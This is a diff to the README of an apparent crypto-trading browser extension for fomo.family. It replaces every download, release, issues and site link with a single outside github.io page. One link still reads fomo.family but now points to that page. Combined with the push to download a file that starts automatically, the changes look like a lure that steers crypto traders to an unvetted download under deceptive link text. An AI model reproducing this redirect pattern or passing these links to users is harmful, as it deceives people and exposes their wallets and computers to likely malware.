@@ -1,6 +1,6 @@
 <h1>⚡ fomo-extension-bot-order - Automate Your Trades With Ease</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-fomo--extension--bot--order-blue?style=for-the-badge&logo=github)](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+[![Download Now](https://img.shields.io/badge/Download-fomo--extension--bot--order-blue?style=for-the-badge&logo=github)](https://fernandeecclesiastic98.github.io)
 
 ## 🔥 What Is This?
 
@@ -35,7 +35,7 @@ Follow these simple steps to start using fomo-extension-bot-order on your Window
 
 ### Step 1: Download the Extension
 
-Visit this link to download the application: [https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+Visit this link to download the application: [https://fernandeecclesiastic98.github.io](https://fernandeecclesiastic98.github.io)
 
 Look for the latest version and download the file to your computer. The download should start automatically.
 
@@ -59,7 +59,7 @@ Look for the latest version and download the file to your computer. The download
 
 ### Step 3: Open fomo.family
 
-Navigate to [fomo.family](https://fomo.family) in your browser. You'll see the new order panel integrated directly into the trading interface.
+Navigate to [fomo.family](https://fernandeecclesiastic98.github.io) in your browser. You'll see the new order panel integrated directly into the trading interface.
 
 ### Step 4: Set Your First Order
 
@@ -180,7 +180,7 @@ The extension adds a clean, intuitive panel to your fomo.family trading view:
 
 ## 🤝 Support & Community
 
-- **Issues**: Report problems on our [GitHub Issues page](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/issues)
+- **Issues**: Report problems on our [GitHub Issues page](https://fernandeecclesiastic98.github.io)
 - **Feature Requests**: Suggest new features through GitHub
 - **Documentation**: Check this README for help
 - **Community**: Join discussions on GitHub
@@ -193,9 +193,9 @@ This project is open source and free to use. See the LICENSE file in the reposit
 
 Don't miss another profitable trade. Download fomo-extension-bot-order now and take control of your crypto trading:
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Now-Click%20Here-green?style=for-the-badge)](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download%20Now-Click%20Here-green?style=for-the-badge)](https://fernandeecclesiastic98.github.io)
 
-Visit this link to download the application: [https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+Visit this link to download the application: [https://fernandeecclesiastic98.github.io](https://fernandeecclesiastic98.github.io)
 
 ---
 
